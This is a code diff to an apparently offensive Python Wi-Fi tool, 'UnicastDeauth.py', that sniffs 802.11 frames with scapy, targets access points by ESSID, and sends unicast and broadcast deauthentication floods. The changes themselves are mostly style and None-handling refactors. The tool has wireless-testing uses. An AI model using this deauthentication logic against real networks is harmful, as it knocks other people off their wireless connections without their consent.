@@ -38,7 +38,7 @@ class MsgException(Exception):
         if self._count == MsgException._count:
             output.append('[!] Exception: ')
         output.append(f'{self._message}')
-        if self.__cause__:
+        if self.__cause__ is not None:
             output.append('. Caused by:\n')
             output.append('    ' * (MsgException._count - self._count + 1))
             output.append(f'[!] Exception: {self.__cause__}')
@@ -122,7 +122,7 @@ def is_unicast(bssid: str) -> bool:
     '''bssid categorizing'''
 
     try:
-        return not (int(bssid.split(':')[0], 16) & 0x1)
+        return int(bssid.split(':')[0], 16) & 1 == 0
     except Exception as e:
         raise MsgException('BSSID could not be categorized') from e
 
@@ -159,6 +159,7 @@ def unicast_deauth(deauth_config: DeauthConfig, bssid_sta: str, bssid_ap: str,
                     count=DEAUTH_COUNT,
                     verbose=False,
                 )
+
         multiprocessing.Process(target=unicast_deauth_parallel).start()
         print_info(
             f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT}'
@@ -191,6 +192,7 @@ def broadcast_deauth(deauth_config: DeauthConfig, bssid_ap: str, bssid_net: str)
                     count=DEAUTH_COUNT,
                     verbose=False,
                 )
+
         multiprocessing.Process(target=broadcast_deauth_parallel).start()
         print_info(
             f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT} broadcast'
@@ -205,29 +207,29 @@ def get_essid(self: dot11.RadioTap) -> typing.Optional[str]:
 
     try:
         dot11_element = self.getlayer(dot11.Dot11Elt)
-        while dot11_element and dot11_element.ID != 0:
+        while dot11_element is not None and dot11_element.ID != 0:
             dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
-        return dot11_element.info.decode() if dot11_element else None
+        return dot11_element.info.decode() if dot11_element is not None else None
     except Exception as e:
         raise MsgException('ESSID could not be parsed') from e
 
 
-def get_src_dst_net(self: dot11.RadioTap) -> tuple[str, str, str]:
+def get_src_dst_net(self: dot11.RadioTap) -> tuple[None, None, None] | tuple[str, str, str]:
     '''frame control field parsing'''
 
     try:
-        to_ds = self.FCfield & 0x1
-        from_ds = self.FCfield & 0x2
-        if to_ds:
-            if from_ds:
-                bssid_src = bssid_dst = bssid_net = ''
+        to_ds = self.FCfield & 1
+        from_ds = self.FCfield & 2
+        if to_ds != 0:
+            if from_ds != 0:
+                bssid_src = bssid_dst = bssid_net = None
             else:
                 bssid_src = self.addr2
                 bssid_dst = self.addr3
                 bssid_net = self.addr1
         else:
             bssid_dst = self.addr1
-            if from_ds:
+            if from_ds != 0:
                 bssid_src = self.addr3
                 bssid_net = self.addr2
             else:
@@ -239,17 +241,17 @@ def get_src_dst_net(self: dot11.RadioTap) -> tuple[str, str, str]:
 
 
 def handle_beacon_proberesp(self: dot11.RadioTap, deauth_config: DeauthConfig,
-                            aps_targetlist: AccessPoints, aps_whitelist:
-                            AccessPoints) -> None:
+                            aps_targetlist: AccessPoints,
+                            aps_whitelist: AccessPoints) -> None:
     '''beacon and probe-resp frames processing'''
 
     try:
         bssid_src, _, bssid_net = self.get_src_dst_net()
         if (
-            bssid_net and
-            bssid_src not in aps_targetlist and
-            bssid_src not in aps_whitelist and
-            self.get_essid() == aps_targetlist.essid
+            bssid_net is not None
+            and bssid_src not in aps_targetlist
+            and bssid_src not in aps_whitelist
+            and self.get_essid() == aps_targetlist.essid
         ):
             aps_targetlist.add(bssid_src)
             if deauth_config.broadcast_enabled:
@@ -265,11 +267,11 @@ def handle_probereq(self: dot11.RadioTap, deauth_config: DeauthConfig,
     try:
         _, bssid_dst, bssid_net = self.get_src_dst_net()
         if (
-            bssid_net and
-            is_unicast(bssid_dst) and
-            bssid_dst not in aps_targetlist and
-            bssid_dst not in aps_whitelist and
-            self.get_essid() == aps_targetlist.essid
+            bssid_net is not None
+            and is_unicast(bssid_dst)
+            and bssid_dst not in aps_targetlist
+            and bssid_dst not in aps_whitelist
+            and self.get_essid() == aps_targetlist.essid
         ):
             aps_targetlist.add(bssid_dst)
             if deauth_config.broadcast_enabled:
@@ -284,17 +286,17 @@ def handle_ctl_data(self: dot11.RadioTap, deauth_config: DeauthConfig,
 
     try:
         bssid_src, bssid_dst, bssid_net = self.get_src_dst_net()
-        if bssid_net:
+        if bssid_net is not None:
             if (
-                is_unicast(bssid_dst) and
-                bssid_src in aps_targetlist and
-                stations[bssid_dst] != bssid_src
+                is_unicast(bssid_dst)
+                and bssid_src in aps_targetlist
+                and stations[bssid_dst] != bssid_src
             ):
                 stations[bssid_dst] = bssid_src
                 unicast_deauth(deauth_config, bssid_dst, bssid_src, bssid_net)
             elif (
-                bssid_dst in aps_targetlist and
-                stations[bssid_src] != bssid_dst
+                bssid_dst in aps_targetlist
+                and stations[bssid_src] != bssid_dst
             ):
                 stations[bssid_src] = bssid_dst
                 unicast_deauth(deauth_config, bssid_src, bssid_dst, bssid_net)
@@ -334,16 +336,6 @@ def main() -> None:
     '''main'''
 
     try:
-        methods_dot11_RadioTap = [
-            get_essid,
-            get_src_dst_net,
-            handle_beacon_proberesp,
-            handle_probereq,
-            handle_ctl_data,
-            handle_frame,
-        ]
-        for method in methods_dot11_RadioTap:
-            setattr(dot11.RadioTap, method.__name__, method)
         examples = [
             'examples:',
             'UnicastDeauth.py -i wlan0 -e NETGEAR -b',
@@ -397,6 +389,7 @@ def main() -> None:
             help='comma-separated APs whitelist',
         )
         args = parser.parse_args()
+
         filters = [
             'wlan type mgt subtype beacon',
             'wlan type mgt subtype probe-req',
@@ -404,6 +397,16 @@ def main() -> None:
             'wlan type ctl',
             'wlan type data',
         ]
+        methods_dot11_RadioTap = [
+            get_essid,
+            get_src_dst_net,
+            handle_beacon_proberesp,
+            handle_probereq,
+            handle_ctl_data,
+            handle_frame,
+        ]
+        for method in methods_dot11_RadioTap:
+            setattr(dot11.RadioTap, method.__name__, method)
         deauth_config = DeauthConfig(
             args.wifi_interface,
             args.broadcast_enabled,
